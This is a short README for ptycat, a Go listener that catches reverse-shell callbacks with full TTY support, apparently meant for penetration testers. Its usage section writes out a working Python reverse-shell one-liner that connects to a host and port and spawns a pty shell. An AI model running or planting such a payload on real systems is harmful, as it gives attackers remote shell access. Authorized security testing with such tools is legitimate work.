# ptycat

Aren't you tired of catching netcat/bash callbacks and forgetting how to muck with tty settings? Tired of hitting CTRL-Z and performing `stty` magic? Me too!

### Installation
```go get github.com/dropk1ck/ptycat```

### Usage
```
ptycat -p <port to listen on>

# ensure you use a reverse shell that spawns a pty on the remote end, like this:
# find more examples at revshells.com
export RHOST="localhost";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

And that's it! CTRL-C, up-arrow, tab-complete to your heart's content.
